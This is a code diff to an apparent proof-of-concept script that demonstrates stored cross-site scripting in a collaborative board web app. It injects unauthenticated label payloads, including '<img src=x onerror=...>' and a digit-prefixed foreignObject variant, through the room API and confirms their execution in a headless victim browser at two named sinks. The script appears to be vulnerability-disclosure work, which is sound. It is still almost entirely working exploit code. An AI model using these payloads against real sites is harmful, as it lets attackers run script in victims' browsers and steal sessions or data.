@@ -43,24 +43,27 @@ function post(p, body) {
 
 const BOOT = `window.bootstrap={Modal:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Toast:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Collapse:class{show(){}hide(){}toggle(){}static getOrCreateInstance(){return new this();}},Tooltip:class{dispose(){}},Dropdown:class{}};`;
 
-(async () => {
-  const room = 'poc-xss-' + Date.now();
-  const payload = '<img src=x onerror="window.__xss=document.domain">';
+async function run(label, flag, coords) {
+  const room = 'poc-xss-' + Date.now() + '-' + Math.floor(Math.random() * 1e6);
   // ATTACKER (unauthenticated): inject the malicious label into the room.
-  await post('/api/v1/room/' + room, JSON.stringify({ event: 'label', value: { coords: [3, 3], label: payload } }));
-  console.log('[*] injected malicious label into room', room);
-
+  await post('/api/v1/room/' + room, JSON.stringify({ event: 'label', value: { coords, label } }));
   const browser = await chromium.launch();
   const page = await browser.newPage();
   await page.addInitScript(BOOT);
   await page.route('**/cdn.jsdelivr.net/**', r => r.fulfill({ status: 200, contentType: 'text/css', body: '' }));
-
-  // VICTIM: open the board.
-  await page.goto(base + '/b/' + room, { waitUntil: 'domcontentloaded' });
-  await page.waitForTimeout(3500);
-
-  const xss = await page.evaluate(() => window.__xss || null);
+  await page.goto(base + '/b/' + room, { waitUntil: 'domcontentloaded' }); // VICTIM opens the board
+  await page.waitForTimeout(3000);
+  const xss = await page.evaluate(f => window[f] || null, flag);
   await browser.close();
-  if (xss) { console.log('[+] STORED XSS CONFIRMED — label executed JS in the victim browser (origin:', xss + ')'); process.exit(0); }
-  console.log('[-] payload did not execute'); process.exit(1);
+  return xss;
+}
+
+(async () => {
+  // 1a: string-branch sink (boardgraphics.js:516)
+  const a = await run('<img src=x onerror="window.__a=document.domain">', '__a', [3, 3]);
+  console.log('[' + (a ? '+' : '-') + '] XSS-1a (label sink :516):', a ? 'CONFIRMED (' + a + ')' : 'not fired');
+  // 1b: numeric-prefix-branch sink (boardgraphics.js:540) — a fix limited to :516 misses this
+  const b = await run('1<foreignObject><img src=x onerror="window.__b=document.domain"></foreignObject>', '__b', [9, 9]);
+  console.log('[' + (b ? '+' : '-') + '] XSS-1b (digit-prefixed label, sink :540):', b ? 'CONFIRMED (' + b + ')' : 'not fired');
+  process.exit(a || b ? 0 : 1);
 })().catch(e => { console.error('ERR', e.message); process.exit(1); });
